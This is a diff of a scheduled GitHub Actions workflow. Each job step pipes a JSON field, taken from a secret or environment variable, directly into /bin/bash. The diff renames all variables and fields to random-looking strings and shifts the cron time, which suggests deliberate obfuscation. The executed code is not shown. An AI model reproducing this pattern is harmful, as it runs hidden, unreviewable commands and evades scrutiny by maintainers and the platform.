@@ -3,21 +3,23 @@ name: liuzhuanxxo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
-jobs:  # 23494
+    - cron: '29 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liuzhuanxxo
         env:
-          pu79158: ${{ secrets.pu79158 }}
+          dhqad29: ${{ secrets.dhqad29 }}
         run: |
-          echo $pu79158 | jq -r .sbp9067 | /bin/bash
-          echo $fe466 | jq -r .eoxiu31 | /bin/bash
-          echo $is7 | jq -r .hv3 | /bin/bash
-          echo $sbmd7603 | jq -r .se7267 | /bin/bash
-          echo $emj75250 | jq -r .woie841 | /bin/bash
-          echo $sgqm92791 | jq -r .bpgcy2 | /bin/bash
-          echo $nab9001 | jq -r .a512 | /bin/bash
+          echo $dhqad29 | jq -r .z332 | /bin/bash
+          echo $p76303 | jq -r .sqtgc15 | /bin/bash
+          echo $ahwhe7 | jq -r .t97 | /bin/bash
+          echo $wzzym5905 | jq -r .uvmn6 | /bin/bash
+          echo $mb43070 | jq -r .r0960 | /bin/bash
+          echo $pr82 | jq -r .in83952 | /bin/bash
+          echo $abw13 | jq -r .dl26 | /bin/bash
+          echo $eaw54999 | jq -r .fz45 | /bin/bash
 
